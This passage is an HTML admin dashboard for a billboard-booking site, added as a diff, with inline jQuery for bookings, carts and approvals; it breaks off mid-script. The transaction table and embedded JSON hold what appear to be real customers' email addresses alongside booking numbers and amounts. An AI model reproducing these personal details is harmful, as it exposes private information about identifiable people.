@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Dashboard - Billboardindo</title>
+
+
+    <link rel="stylesheet" href="/mediaweb/lib/bootstrap/dist/css/bootstrap.css" />
+    <link rel="stylesheet" href="/mediaweb/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/mediaweb/css/font-awesome.min.css" />
+
+
+    <style type="text/css">
+        #map_canvas {
+            height: 400px;
+        }
+    </style>
+
+    <link href="/mediaweb/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/mediaweb/css/jquery-ui.css" />
+    <link rel="stylesheet" href="/mediaweb/css/bootstrap/bootstrap-datetimepicker.css" />
+    <link rel="stylesheet" href="/mediaweb/css/simple-sidebar.css" />
+    <link rel="stylesheet" href="/mediaweb/css/basic.css" />
+    <link rel="stylesheet" href="/mediaweb/css/dropzone.css" />
+    <link rel="stylesheet" href="/mediaweb/css/site.css" />
+    <link rel="stylesheet" href="/mediaweb/css/login.css" />
+    <link rel="stylesheet" href="/mediaweb/css/custom.css" />
+    <link rel="stylesheet" href="/mediaweb/css/buttons.dataTables.min.css" />
+    <link rel="stylesheet" href="/mediaweb/css/jquery.dataTables.min.css" />
+
+    <link rel="stylesheet" href="css/mystyle.css">
+    <link rel="stylesheet" href="css/dashboardcss.css">
+</head>
+
+<body class="debug_mode">
+    <div class="d-flex" id="wrapper">
+        <div id="loadmodal" class="modal fade bd-example-modal-lg" data-backdrop="static" data-keyboard="false"
+            tabindex="-1">
+            <div class="modal-dialog modal-sm">
+                <div class="modal-content" style="width: 48px">
+                    <span class="fa fa-spinner fa-spin fa-3x"></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sidebar -->
+        <div class="bg-light border-right bg-side" id="sidebar-wrapper">
+            <div class="sidebar-heading" style="background:white;"><a class="nav-link txt-black"
+                    style="background:white !important;" href="/mediaweb"> <span
+                        style="font-weight: 700;">Billboardindo</span><span class="float-right"
+                        style="margin-bottom: 20px;">Dashboard</span></a></div>
+            <div class="list-group list-group-flush list-dash">
+                <a id="uploadsiteMenu" class="nav-link txt-white active"
+                    style="margin-left:-3px;width:101%; margin-bottom: 25px; padding: 10px;" href="#">
+                    <img src="/mediaweb/image/iconupl.svg" style="width:30px; margin-left: 20px; margin-right: 20px;">
+                    Upload Site
+                </a>
+                <a id="userMenu" class="nav-link txt-white"
+                    style="margin-left:-3px;width:101%; margin-bottom: 3px; padding: 10px; background-color: rgb(175, 0, 6) !important;" href="#">
+                    <img src="/mediaweb/image/iconusp.svg" style="width:25px; margin-left: 20px; margin-right: 20px;">
+                    User Profile
+                </a>
+                <a id="mownerMenu" class="nav-link txt-white"
+                    style="margin-left:-3px;width:101%; margin-bottom: 3px; padding: 10px;" href="#"> <img
+                        src="/mediaweb/image/iconupl.svg" style="width:30px; margin-left: 20px; margin-right: 20px;">
+                    Media
+                    Owner</a>
+                <a id="orderMenu" class="nav-link txt-white"
+                    style="margin-left:-3px;width:101%; margin-bottom: 3px; padding: 10px;" href="#"> <img
+                        src="/mediaweb/image/iconupl.svg" style="width:30px; margin-left: 20px; margin-right: 20px;">
+                    Order</a>
+                <a id="listsiteMenu" class="nav-link txt-white"
+                    style="margin-left:-3px;width:101%; margin-bottom: 3px; padding: 10px;" href="#">
+                    <img src="/mediaweb/image/iconlst.svg" style="width:30px; margin-left: 20px; margin-right: 20px;">
+                    List Site
+                </a>
+                <a id="bankaccountMenu" class="nav-link txt-white"
+                    style="margin-left:-3px;width:101%;margin-bottom: 25px; padding: 10px;" href="#">
+                    <img src="/mediaweb/image/iconbac.svg" style="width:30px; margin-left: 20px; margin-right: 20px;">
+                    Bank Accounts
+                </a>
+                <button id="regionMenu" class="dropdown-btn txt-white"
+                    style="margin-left:-3px;width:101%; padding: 10px 10px 10px 35px;">
+                    Transaction
+                    <i class="fa fa-caret-down"></i>
+                </button>
+                <div class="dropdown-container" style="background:darkred;">
+                    <a class="nav-link txt-white" style="background:rgb(233, 78, 83) !important;"
+                        href="/mediaweb/Province">List
+                        order</a>
+                    <a class="nav-link txt-white" style="background:rgb(233, 78, 83) !important;"
+                        href="/mediaweb/City">Traffic
+                        Site</a>
+                </div>
+            </div>
+        </div>
+        <!-- /#sidebar-wrapper -->
+        <!-- Page Content -->
+        <div id="page-content-wrapper">
+            <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom bg-header">
+                <button class="btn txt-white" id="menu-toggle">Menu</button>
+                <h5>Welcome Admin</h5>
+                <button class="navbar-toggler" type="button" data-toggle="collapse"
+                    data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
+                    aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="navbar-collapse collapse d-sm-inline-flex flex-sm-row-reverse txt-white"
+                    id="navbarSupportedContent">
+                    <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
+                        <li id="cartMenu" class="nav-item" style="padding-left:15px;display:none;">
+                            <a class="nav-link txt-white" href="/mediaweb/Wish/Keranjang">
+                                <i class="fas fa-shopping-cart" style="font-size:25px;"></i>
+                            </a>
+                        </li>
+                        <li id="wishMenu" class="nav-item" style="padding-left:15px;display:none;">
+                            <a class="nav-link txt-white" href="/mediaweb/Wish">
+                                <i class="fa fa-bookmark" style="font-size:25px;"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <div class="subscribe">
+                                <div class="input-group">
+                                    <input type="email" class="form-control" placeholder="Search">
+                                    <div class="input-group-append">
+                                        <button type="submit" class="input-group-text btn">Search</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li id="profileMenu" class="nav-item dropdown" style="display:none;">
+                            <button class="dropbtn-nav txt-white">
+                                <img src="/mediaweb/image/user.png" class="profile-image img-circle" style="width:25px">
+                                Admin <i class="fa fa-caret-down"></i>
+                            </button>
+                            <div class="dropdown-content" style="left:0;padding-left:25px;">
+                                <a class="nav-link txt-grey" href="/mediaweb/Profile/Update">Edit Profile</a>
+                                <a class="nav-link txt-grey" href="/mediaweb/Profile/ChangePassword">Change Password</a>
+                                <a class="nav-link txt-grey" href="/mediaweb/Profile/LogOut">Log Out</a>
+                            </div>
+                        </li>
+                        <li id="loginMenu" class="nav-item" style="display:none;">
+                            <a class="nav-link txt-white" href="/mediaweb/Login/Logon">Login</a>
+                        </li>
+                    </ul>
+                </div>
+            </nav>
+            <div class="container container-fluid">
+
+
+
+                <main role="main" class="pb-3">
+
+                    <div class="row" style="padding: 7px;margin-bottom: 10px;">
+                        <div class="row" style="width:100%;margin-left:0px; padding: 10px 40px 20px 40px;">
+                            <div class="col-lg-3 col-md-6 col-sm-6">
+                                <div class="card card-stats">
+                                    <div class="card-header card-header-icon" style="height:170px;">
+                                        <div class="card-icon" style="border-radius:6px;background:#F0A205 !important;">
+                                            <img src="/mediaweb/image/iconplay.svg" style="width:80px">
+                                        </div>
+                                        <p class="card-category">Used Site</p>
+                                        <h3 class="card-title text-center" style="margin-top:50px;">
+                                            0/5000
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-lg-3 col-md-6 col-sm-6">
+                                <div class="card card-stats">
+                                    <div class="card-header card-header-icon" style="height:170px;">
+                                        <div class="card-icon" style="border-radius:6px;background:#34B14D;">
+                                            <img src="/mediaweb/image/iconrev.svg" style="width:80px">
+                                        </div>
+                                        <p class="card-category">Revenue</p>
+                                        <h3 class="card-title text-center" style="margin-top:50px;">
+                                            Rp 0
+                                            <small>/000</small>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-lg-3 col-md-6 col-sm-6">
+                                <div class="card card-stats">
+                                    <div class="card-header card-header-icon" style="height:170px;">
+                                        <div class="card-icon" style="border-radius:6px;background:#0E62AC">
+                                            <img src="/mediaweb/image/iconunp.svg" style="width:80px">
+                                        </div>
+                                        <p class="card-category">Unpaid</p>
+                                        <h3 class="card-title text-center" style="margin-top:50px;">
+                                            2
+                                            <small>order</small>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-lg-3 col-md-6 col-sm-6">
+                                <div class="card card-stats">
+                                    <div class="card-header card-header-icon" style="height:170px;">
+                                        <div class="card-icon" style="border-radius:6px;background:#E72F8B;">
+                                            <img src="/mediaweb/image/iconto.svg" style="width:80px">
+                                        </div>
+                                        <p class="card-category">Total Order</p>
+                                        <h3 class="card-title text-center" style="margin-top:50px;">
+                                            0
+                                            <small>/month</small>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="histo w-100" style="padding: 10px 40px 20px 50px; ">
+                            <div id="chartContainer" class="myautoscroll"
+                                style="height: 350px; width: 100%; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);padding:20px;margin:10px;">
+                            </div>
+                        </div>
+                        <div class="table-transaksi w-100 h-100" style="padding: 10px 20px 20px 20px;">
+                            <div class="row"
+                                style="width:100%; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);overflow-x:auto;padding:20px;margin:10px;">
+                                <div class="div-title">
+                                    <p>Daftar Transaksi</p>
+                                </div>
+                                <div class="subscribe-table ml-auto">
+                                    <div class="input-group">
+                                        <input id="input-search" type="email" class="form-control" placeholder="Search">
+                                        <div class="input-group-append">
+                                            <button id="search-button" type="submit"
+                                                class="input-group-text btn">Search</button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="box-body auto-table myautoscroll">
+                                    <table id="tdasboard" class="table table-bordered table-striped"
+                                        style="width:100%;">
+                                        <thead class="thead-dark">
+                                            <tr>
+                                                <th scope="col">No</th>
+                                                <th scope="col">Booking Number</th>
+                                                <th scope="col">User Name</th>
+                                                <th scope="col">No Billboard</th>
+                                                <th scope="col">Tgl Book</th>
+                                                <th scope="col">Tgl Start</th>
+                                                <th scope="col">Tgl End</th>
+                                                <th scope="col">Tgl Transaksi</th>
+                                                <th scope="col">Status</th>
+                                                <th scope="col">Status Pembayaran</th>
+                                                <th scope="col">Durasi</th>
+                                                <th scope="col">Unit</th>
+                                                <th scope="col">Harga</th>
+                                                <th scope="col">Total</th>
+                                                <th scope="col">Action</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td>1</td>
+                                                <td>BK/2020/3/9/701</td>
+                                                <td>ronny.p@live.com</td>
+                                                <td>6884JTJW</td>
+                                                <td class="custom-date">2020-03-09</td>
+                                                <td class="custom-date">2020-03-09</td>
+                                                <td class="custom-date">2020-03-17</td>
+                                                <td class="custom-date"></td>
+                                                <td>On Progress</td>
+                                                <td></td>
+                                                <td>8</td>
+                                                <td></td>
+                                                <td class="price">1466664</td>
+                                                <td class="price">11733312</td>
+                                                <td><button class="btn btn-primary"
+                                                        onclick="btnapprove('1&58de958b-ee89-4494-a764-7a736d27067f|BK/2020/3/9/701&accept')">Accept</button><button
+                                                        class="btn btn-danger"
+                                                        onclick="btnapprove('2&58de958b-ee89-4494-a764-7a736d27067f|BK/2020/3/9/701&declined')">Decline</button>
+                                                </td>
+
+                                            </tr>
+                                            <tr>
+                                                <td>2</td>
+                                                <td>BK/2020/3/12/168</td>
+                                                <td>rudy.130390@gmail.com</td>
+                                                <td>7097JKJW</td>
+                                                <td class="custom-date">2020-03-12</td>
+                                                <td class="custom-date">2020-03-12</td>
+                                                <td class="custom-date">2020-03-21</td>
+                                                <td class="custom-date"></td>
+                                                <td>On Progress</td>
+                                                <td></td>
+                                                <td>9</td>
+                                                <td></td>
+                                                <td class="price">57750003</td>
+                                                <td class="price">519750027</td>
+                                                <td><button class="btn btn-primary"
+                                                        onclick="btnapprove('1&47103c2c-b158-4296-a434-d4d195f4a5fc|BK/2020/3/12/168&accept')">Accept</button><button
+                                                        class="btn btn-danger"
+                                                        onclick="btnapprove('2&47103c2c-b158-4296-a434-d4d195f4a5fc|BK/2020/3/12/168&declined')">Decline</button>
+                                                </td>
+
+                                            </tr>
+                                            <tr>
+                                                <td>3</td>
+                                                <td>BK/2020/3/12/168</td>
+                                                <td>rudy.130390@gmail.com</td>
+                                                <td>7097JKJW</td>
+                                                <td class="custom-date">2020-03-12</td>
+                                                <td class="custom-date">2020-03-12</td>
+                                                <td class="custom-date">2020-03-21</td>
+                                                <td class="custom-date"></td>
+                                                <td>On Progress</td>
+                                                <td></td>
+                                                <td>9</td>
+                                                <td></td>
+                                                <td class="price">57750003</td>
+                                                <td class="price">519750027</td>
+                                                <td><button class="btn btn-primary"
+                                                        onclick="btnapprove('1&47103c2c-b158-4296-a434-d4d195f4a5fc|BK/2020/3/12/168&accept')">Accept</button><button
+                                                        class="btn btn-danger"
+                                                        onclick="btnapprove('2&47103c2c-b158-4296-a434-d4d195f4a5fc|BK/2020/3/12/168&declined')">Decline</button>
+                                                </td>
+
+                                            </tr>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
+        <!-- /#page-content-wrapper -->
+        <footer class="border-top footer text-muted bg-header footer-dash">
+            <div class="container" style="color: #fff;">
+                &copy; 2020 - Billboarindo - <a href="/mediaweb/Home/Privacy">Privacy</a>
+            </div>
+        </footer>
+    </div>
+    <!-- /#wrapper -->
+
+
+    <script type="text/javascript" src="/mediaweb/js/jquery/jquery-v3.4.1.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="/mediaweb/lib/bootstrap/dist/js/bootstrap.bundle.js" crossorigin="anonymous">
+    </script>
+
+
+    <script type="text/javascript" src="/mediaweb/js/jquery/jquery-ui.js?v=T0Vest3yCU7pafRw9r-settMBX6JkKN06dqBnpQ8d30">
+    </script>
+    <script type="text/javascript" src="/mediaweb/js/site.js?v=4q1jwFhaPaZgr8WAUSrux6hAuh0XDg9kPS3xIVq36I0"></script>
+    <script type="text/javascript" src="/mediaweb/js/dropzone.js?v=NLit4Z57jz8npRHkopjfr68hSZY1x_ruN0T8kf68xq4">
+    </script>
+    <script type="text/javascript" src="/mediaweb/js/dropzone.min.js?v=fIn7-wa-KI2s9jjRMk_rcswRt8mf82rxIXntRYKLofg">
+    </script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js"></script>
+    <script type="text/javascript" src='https://kit.fontawesome.com/a076d05399.js'></script>
+    <script type="text/javascript" src="/mediaweb/js/Moment-with-local.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/canvasjs.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/dropzone.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/dropzone.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/lib/jquery-validation/dist/jquery.validate.js"></script>
+    <script type="text/javascript" src="/mediaweb/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.js">
+    </script>
+    <script type="text/javascript" src="/mediaweb/js/bootstrap/bootstrap.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/bootstrap/bootsrap-datetimepicker.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/jquery.dataTables.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/dataTables.buttons.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/buttons.flash.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/buttons.html5.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/buttons.print.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/jszip.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/pdfmake.min.js"></script>
+    <script type="text/javascript" src="/mediaweb/js/DataTable/vfs_fonts.js"></script>
+    <script>
+        //#region DetailPage
+        var siteData = {
+            "KotakEmpat": {
+                "TotalRevenue": 0,
+                "TotalOrder": 0,
+                "TotalBooking": 2,
+                "TotalUseSite": 0
+            },
+            "PurchaseAndBook": [{
+                "BookID": "58de958b-ee89-4494-a764-7a736d27067f",
+                "UserName": "ronny.p@live.com",
+                "Status": "On Progress",
+                "NoBillBoard": "6884JTJW",
+                "Qty": 8,
+                "Unit": "",
+                "Harga": 1466664.0,
+                "HargaTotal": 11733312.0,
+                "TglBook": "2020-03-09T19:25:04.0485355",
+                "TglTrans": null,
+                "StartDate": "2020-03-09T00:00:00",
+                "EndDate": "2020-03-17T00:00:00",
+                "BookNo": "BK/2020/3/9/701"
+            }, {
+                "BookID": "47103c2c-b158-4296-a434-d4d195f4a5fc",
+                "UserName": "rudy.130390@gmail.com",
+                "Status": "On Progress",
+                "NoBillBoard": "7097JKJW",
+                "Qty": 9,
+                "Unit": "",
+                "Harga": 57750003.0,
+                "HargaTotal": 519750027.0,
+                "TglBook": "2020-03-12T18:18:42.3602537",
+                "TglTrans": null,
+                "StartDate": "2020-03-12T00:00:00",
+                "EndDate": "2020-03-21T00:00:00",
+                "BookNo": "BK/2020/3/12/168"
+            }]
+        };
+        var Dcity;
+        if (siteData != null) {
+            Dcity = siteData.Cities;
+        }
+
+        function initMap3() {
+            // map options
+            var map3;
+            var marker3;
+            var options = {
+                zoom: 5,
+                center: new google.maps.LatLng(-3.5058155, 122.6757871),
+                mapTypeId: google.maps.MapTypeId.TERRAIN,
+                mapTypeControl: false
+            };
+            if (Dcity != null) {
+                if (Dcity.length > 0) {
+                    options = {
+                        zoom: 5,
+                        center: new google.maps.LatLng(Dcity[0]['Lat'], Dcity[0]['Lng']),
+                        mapTypeId: google.maps.MapTypeId.TERRAIN,
+                        mapTypeControl: false
+                    };
+                }
+                map3 = new google.maps.Map(document.getElementById('map_canvas3'), options);
+                for (var i = 0; i < Dcity.length; i++) {
+                    // init markers
+                    marker3 = new google.maps.Marker({
+                        position: new google.maps.LatLng(Dcity[i]['Lat'], Dcity[i]['Lng']),
+                        map: map3,
+                        title: Dcity[i]['Title']
+                    });
+                    var infowindow = new google.maps.InfoWindow({});
+                    google.maps.event.addListener(marker3, 'click', (function (marker3, i) {
+                        return function () {
+                            var contentString = '<div id="content">' +
+                                '<h1>' + Dcity[i]['Title'] + '</h1>' +
+                                '<p>Latitude : ' + Dcity[i]['Lat'] + '</p>' +
+                                '<p>Longitude : ' + Dcity[i]['Lng'] + '</p>' +
+                                '</div>';
+                            infowindow.setContent(Dcity[i]['Title']);
+                            infowindow.setContent(contentString);
+                            infowindow.open(map3, marker3);
+                        }
+                    })(marker3, i));
+                }
+            }
+        }
+
+        google.maps.event.addDomListener(window, 'load', initMap3);
+        //#endregion
+
+        $("#menu-toggle").click(function (e) {
+            e.preventDefault();
+            $("#wrapper").toggleClass("toggled");
+        });
+        var dropdown = document.getElementsByClassName("dropdown-btn");
+        for (var i = 0; i < dropdown.length; i++) {
+            dropdown[i].addEventListener("click", function () {
+                this.classList.toggle("active");
+                var dropdownContent = this.nextElementSibling;
+                if (dropdownContent.style.display === "block") {
+                    dropdownContent.style.display = "none";
+                } else {
+                    dropdownContent.style.display = "block";
+                }
+            });
+        }
+        var mapsData = {
+            "KotakEmpat": {
+                "TotalRevenue": 0,
+                "TotalOrder": 0,
+                "TotalBooking": 2,
+                "TotalUseSite": 0
+            },
+            "PurchaseAndBook": [{
+                "BookID": "58de958b-ee89-4494-a764-7a736d27067f",
+                "UserName": "ronny.p@live.com",
+                "Status": "On Progress",
+                "NoBillBoard": "6884JTJW",
+                "Qty": 8,
+                "Unit": "",
+                "Harga": 1466664.0,
+                "HargaTotal": 11733312.0,
+                "TglBook": "2020-03-09T19:25:04.0485355",
+                "TglTrans": null,
+                "StartDate": "2020-03-09T00:00:00",
+                "EndDate": "2020-03-17T00:00:00",
+                "BookNo": "BK/2020/3/9/701"
+            }, {
+                "BookID": "47103c2c-b158-4296-a434-d4d195f4a5fc",
+                "UserName": "rudy.130390@gmail.com",
+                "Status": "On Progress",
+                "NoBillBoard": "7097JKJW",
+                "Qty": 9,
+                "Unit": "",
+                "Harga": 57750003.0,
+                "HargaTotal": 519750027.0,
+                "TglBook": "2020-03-12T18:18:42.3602537",
+                "TglTrans": null,
+                "StartDate": "2020-03-12T00:00:00",
+                "EndDate": "2020-03-21T00:00:00",
+                "BookNo": "BK/2020/3/12/168"
+            }]
+        };
+        var cities;
+        if (mapsData != null) {
+            cities = mapsData.Cities
+        }
+        var domain = 'MediaWeb';
+        var BaseUrl = window.location.origin;
+        if (domain != "") {
+            BaseUrl += "/" + domain;
+        }
+        var isFiltered = 'ADM';
+        var siteIndexUrl = '/mediaweb/Site';
+
+        function modalShow() {
+            $("#loadmodal").modal("show");
+        }
+
+        function modalHide() {
+            $("#loadmodal").modal("hide");
+        }
+
+        //#region UploadImage
+        Dropzone.autoDiscover = false;
+        if (document.getElementById("dropzoneJsForm")) {
+            var myDropzone = new Dropzone("#dropzoneJsForm", {
+                paramName: "file",
+                maxFilesize: 20,
+                maxFiles: 4,
+                acceptedFiles: "image/*",
+                dictMaxFilesExceeded: "Maximum files are 4 files 1 time.",
+                init: function () {
+                    this.on("success", function (data) {
+                        console.log('Success');
+                        console.log(data);
+                    });
+                }
+            });
+        }
+        //#endregion
+
+        //#region Dropdown
+        function FillBank() {
+            $.post(BaseUrl + "/Dashboard/GetBank", null, function (data) {
+                if (data) {
+                    //console.log(data);
+                    var bankid = $("#bankIDHidden").val();
+                    $("#lstbank").append("<option value=''>Pilih Bank</option>");
+                    $(data).each(function () {
+                        if (this.bankID == bankid) {
+                            $("#lstbank").append('<option value=' + this.bankID + ' selected>' + this
+                                .bank +
+                                '</option >');
+                        } else {
+                            $("#lstbank").append($('<option/>', {
+                                value: this.bankID
+                            }).html(this.bank));
+                        }
+                    });
+                }
+            }, 'json')
+        }
+
+        function FillType() {
+            $.post(BaseUrl + "/Dashboard/GetType", null, function (data) {
+                if (data) {
+                    //console.log(data);
+                    var typekode = $("#typeIDHidden").val();
+                    $("#lsttype").append("<option value=''>Pilih Type</option>");
+                    $(data).each(function () {
+                        if (this.type == typekode) {
+                            $("#lsttype").append('<option value=' + this.type + ' selected>' + this
+                                .type +
+                                '</option >');
+                        } else {
+                            $("#lsttype").append($('<option/>', {
+                                value: this.type
+                            }).html(this.type));
+                        }
+                        //$("#stypemenu").append('<a href="#" class="filter smenu">' + this.type + '</a>');
+                    });
+                }
+            }, 'json')
+        }
+
+        function FillProvince() {
+            $.post(BaseUrl + "/Dashboard/GetProvince", null, function (data) {
+                if (data) {
+                    //console.log(data);
+                    var provID = $("#selectedProv").val();
+                    $("#lstprovince").append("<option value=''>Pilih Provinsi</option>");
+                    $(data).each(function () {
+                        if (this.provinsi == provID || this.provinceID == provID) {
+                            $("#lstprovince").append('<option value=' + this.kode + '|' + this
+                                .provinsi +
+                                ' selected>' + this.provinsi + '</option >');
+                            $.post(BaseUrl + "/Dashboard/GetCity?kodeprov=" + this.kode, null,
+                                function (
+                                    data) {
+                                    if (data) {
+                                        $("#lstcity").empty();
+                                        //console.log(data);
+                                        var cityID = $("#selectedCity").val();
+                                        $("#lstcity").append(
+                                            "<option value=''>Pilih Kota</option>");
+                                        $(data).each(function () {
+                                            //console.log(this);
+                                            if (this.kota == cityID) {
+                                                $("#lstcity").append('<option value=' + this
+                                                    .kota + ' selected>' + this.kota +
+                                                    '</option >');
+                                            } else {
+                                                $("#lstcity").append($('<option/>', {
+                                                    value: this.kota
+                                                }).html(this.kota));
+                                            }
+                                        });
+                                    }
+                                }, 'json')
+                        } else {
+                            $("#lstprovince").append($('<option/>', {
+                                value: this.kode + '|' + this.provinsi
+                            }).html(this.provinsi));
+                        }
+                    });
+                }
+            }, 'json')
+        }
+
+        $("#lstprovince").change(function () {
+            var kode = document.getElementById("lstprovince").value
+            if (kode != 0) {
+                kode = kode.split('|', 1);
+                $.post(BaseUrl + "/Dashboard/GetCity?kodeprov=" + kode, null, function (data) {
+                    if (data) {
+                        $("#lstcity").empty();
+                        //console.log(data);
+                        var cityID = $("#selectedCity").val();
+                        $("#lstcity").append("<option value=''>Pilih Kota</option>");
+                        $(data).each(function () {
+                            //console.log(this);
+                            if (this.kota == cityID) {
+                                $("#lstcity").append('<option value=' + this.kota +
+                                    ' selected>' +
+                                    this.kota + '</option >');
+                            } else {
+                                $("#lstcity").append($('<option/>', {
+                                    value: this.kota
+                                }).html(this.kota));
+                            }
+                        });
+                    }
+                }, 'json')
+            }
+        });
+        //#endregion
+
+        //#region NumberFormat
+        function setInputFilter(textbox, inputFilter) {
+            ["input", "keydown", "keyup", "mousedown", "mouseup", "select", "contextmenu", "drop"].forEach(function (
+                event) {
+                textbox.addEventListener(event, function () {
+                    if (inputFilter(this.value)) {
+                        this.oldValue = this.value;
+                        this.oldSelectionStart = this.selectionStart;
+                        this.oldSelectionEnd = this.selectionEnd;
+                    } else if (this.hasOwnProperty("oldValue")) {
+                        this.value = this.oldValue;
+                        this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
+                    } else {
+                        this.value = "";
+                    }
+                });
+            });
+        }
+
+        function addCommas(nStr) {
+            //console.log(nStr);
+            nStr += '';
+            var comma = /,/g;
+            nStr = nStr.replace(comma, '');
+            x = nStr.split('.');
+            x1 = x[0];
+            x2 = x.length > 1 ? '.' + x[1] : '';
+            var rgx = /(\d+)(\d{3})/;
+            while (rgx.test(x1)) {
+                x1 = x1.replace(rgx, '$1' + ',' + '$2');
+            }
+            return x1 + x2;
+        }
+        //#endregion
+
+        //#region DateFormat
+        function formatDate(date) {
+            //var monthNames = [
+            //	"January", "February", "March",
+            //	"April", "May", "June", "July",
+            //	"August", "September", "October",
+            //	"November", "December"
+            //];
+            var monthNames = [
+                "Jan", "Feb", "Mar",
+                "Apr", "May", "Jun", "Jul",
+                "Aug", "Sep", "Oct",
+                "Nov", "Dec"
+            ];
+
+
+            var day = date.getDate();
+            var monthIndex = date.getMonth();
+            var year = date.getFullYear();
+
+            return day + ' ' + monthNames[monthIndex] + ' ' + year;
+        }
+        //#endregion
+
+        //#region lOader
+        function showLoader() {
+            document.getElementById("loader").style.display = "block";
+            document.getElementById("divload").style.display = "none";
+        }
+
+        function showPage() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("divload").style.display = "block";
+        }
+        //#endregion
+
+        //#region Cart
+        function addtoCart(target, bookID) {
+            $.post(target, {
+                    ID: bookID
+                },
+                function (returnedData) {
+                    $.get(domain + "/Wish/Keranjang", function (data, status) {
+                        //alert("Data added to Cart");
+                        location.reload(true);
+                    });
+                }).fail(function (e) {
+                console.log("error");
+                console.log(e);
+            });
+        }
+
+        function deleteCart(target, bookID) {
+            $.post(target, {
+                    ID: bookID
+                },
+                function (returnedData) {
+                    $.get(domain + "/Wish/Keranjang", function (data, status) {
+                        alert("Data Deleted from Cart");
+                        location.reload(true);
+                    });
+                }).fail(function (e) {
+                console.log("error");
+                console.log(e);
+            });
+        }
+        //#endregion
+
+        //#region AddtoWishList
+        function addWish(target, site, item) {
+            $.post(target, {
+                    Site: site,
+                    Item: item
+                },
+                function (returnedData) {
+                    alert("Data Added to Wish List");
+                }).fail(function (e) {
+                console.log("error");
+                console.log(e);
+            });
+        }
+        //#endregion
+
+        //#region Compare
+        function addCompare(target, site, item) {
+            $.post(target, {
+                    Site: site,
+                    Item: item
+                },
+                function (returnedData) {
+                    alert("Data Added to Compare");
+                    $.get(domain + "/Rest/ViewCompare", function (data, status) {
+                        $('#comview').html(data);
+                    });
+                }).fail(function (e) {
+                console.log("error");
+                console.log(e);
+            });
+        }
+
+        function deleteCompare(target, compareid) {
+            $.post(target, {
+                    compareID: compareid
+                },
+                function (returnedData) {
+                    alert("Data deleted from Compare");
+                    $.get(domain + "/Rest/ViewCompare", function (data, status) {
+                        $('#comview').html(data);
+                    });
+                }).fail(function (e) {
+                console.log("error");
+                console.log(e);
+            });
+        }
+        //#endregion
+
+        function btnapprove(link) {
+            modalShow();
+            let target = link.split('|')[0];
+            let dofor = link.split('|')[1];
+            //$.post("/Dashboard/Update", { ID: target },
+            $.post("/MediaWeb/Dashboard/Update", {
+                    ID: target
+                },
+                function (returnedData) {
+                    if (dofor.split('&')[1] == 'accept') {
+                        alert("Nomor booking " + dofor.split('&')[0] + " berhasil diapprove")
+                    } else {
+                        alert("Nomor booking " + dofor.split('&')[0] + " berhasil ditolak")
+                    }
+                    //alert("Data Updated");
+                    //$.get("/Dashboard/Index", function (data, status) {
+                    $.get("/MediaWeb/Dashboard/Index", function (data, status) {
+                        location.reload();
+                    });
+                    modalHide();
+                }).fail(function (e) {
+                alert("Fail to Update " + e);
+                modalHide();
+            });
+        }
+
+        //#region SC
+        (function () {
+            if (!$('body').hasClass('debug_mode')) {
+                var _z = console;
+                Object.defineProperty(window, "console", {
+                    get: function () {
+                        if ((window && window._z && window._z._commandLineAPI) || {}) {
+                            return "Nice trick! but not permitted!";
+                        }
+                        return _z;
+                    },
+                    set: function (val) {
+                        _z = val;
+                    }
+                });
+            }
+        })();
+        //#endregion
+
+        window.onload = function () {
+            if (document.getElementById('chartContainer') != null) {
+                var dataPoints = [];
+                var chart = new CanvasJS.Chart("chartContainer", {
+                    animationEnabled: true,
+                    theme: "light2", // "light1", "light2", "dark1", "dark2"
+                    title: {
+                        text: "Billboard Monthly"
+                    },
+                    axisY: {
+                        title: "Total Book"
+                    },
+                    data: [{
+                        type: "column",
+                        showInLegend: true,
+                        legendMarkerColor: "grey",
+                        legendText: "Total Book",
